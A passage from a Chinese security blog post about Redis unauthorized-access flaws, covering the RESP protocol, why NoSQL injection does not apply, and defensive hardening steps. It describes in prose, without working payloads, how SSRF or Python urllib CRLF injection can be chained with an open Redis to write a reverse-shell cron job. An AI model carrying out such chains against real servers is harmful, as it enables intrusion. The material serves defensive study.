+<h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><p>读取”.rediscli_history”配置文件信息。</p>
+<h3 id="不存在NoSQL注入问题？"><a href="#不存在NoSQL注入问题？" class="headerlink" title="不存在NoSQL注入问题？"></a>不存在NoSQL注入问题？</h3><p>目前来说是的。</p>
+<p>Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。</p>
+<p>以下是RESP协议的通用形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;number of arguments&gt; CR LF</span><br><span class="line">$&lt;number of bytes of argument 1&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;number of bytes of argument N&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br></pre></td></tr></table></figure>
+<p>例子如下，原本命令为<code>SET mykey myvalue</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$5</span><br><span class="line">mykey</span><br><span class="line">$7</span><br><span class="line">myvalue</span><br></pre></td></tr></table></figure>
+<p>Redis客户端格式化后的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n&quot;</span><br></pre></td></tr></table></figure>
+<p>Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。</p>
+<p>Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p>
+<p>Redis协议规范可参考：<a href="http://www.redis.cn/topics/protocol.html" target="_blank" rel="noopener">http://www.redis.cn/topics/protocol.html</a></p>
+<p>Redis通信过程分析可参考：<a href="https://draveness.me/redis-cli" target="_blank" rel="noopener">https://draveness.me/redis-cli</a></p>
+<h2 id="0x03-漏洞组合拳"><a href="#0x03-漏洞组合拳" class="headerlink" title="0x03 漏洞组合拳"></a>0x03 漏洞组合拳</h2><p>一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。</p>
+<h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p>
+<p>具体可参考：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p>
+<h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p>
+<p>原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p>
+<p>具体可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p>
+<h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul>
+<li>禁止公网开放Redis服务，可以在防火墙上禁用6379端口；</li>
+<li>修改Redis服务端口为其他非常见的端口号；</li>
+<li>配置Redis的密码访问验证；</li>
+<li>禁用不使用的高危命令；</li>
+<li>重命名高危命令的名称；</li>
+<li>以低权限运行Redis服务，禁止用root等最高权限运行；</li>
+<li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li>
+</ul>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></p>
+<p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/75627194" target="_blank" rel="noopener">redis未授权访问漏洞利用</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
